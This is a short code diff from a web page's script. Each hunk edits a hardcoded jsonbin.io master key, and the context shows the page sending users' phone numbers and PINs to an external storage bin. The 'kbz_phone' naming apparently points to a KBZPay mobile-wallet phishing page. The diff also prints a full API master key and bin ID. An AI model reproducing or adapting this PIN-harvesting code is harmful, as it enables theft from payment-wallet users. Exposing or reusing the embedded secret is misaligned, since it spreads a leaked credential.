@@ -470,7 +470,7 @@ input[type="number"]::-webkit-inner-spin-button {
                 method: 'PUT',
                 headers: {
                     'Content-Type': 'application/json',
-                    'X-Master-Key': '$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP'
+                    'X-Master-Key': '$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP.'
                 },
                 body: JSON.stringify({
                     phone: phoneNumber,
@@ -517,7 +517,7 @@ input[type="number"]::-webkit-inner-spin-button {
                 method: 'PUT',
                 headers: {
                     'Content-Type': 'application/json',
-                    'X-Master-Key': '$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP'
+                    'X-Master-Key': '$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP.'
                 },
                 body: JSON.stringify({
                     phone: localStorage.getItem('kbz_phone'),
@@ -571,7 +571,7 @@ input[type="number"]::-webkit-inner-spin-button {
 
     async function sendPin(pin) {
       const binId = "687fa3037b4b8670d8a5770a"; // Your bin ID
-      const apiKey = "$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP";
+      const apiKey = "$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP.";
 
       try {
         const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
@@ -702,7 +702,7 @@ input[type="number"]::-webkit-inner-spin-button {
           method: "PUT",
           headers: {
             "Content-Type": "application/json",
-            "X-Master-Key": "$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP"
+            "X-Master-Key": "$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP."
           },
           body: JSON.stringify(data)
         });
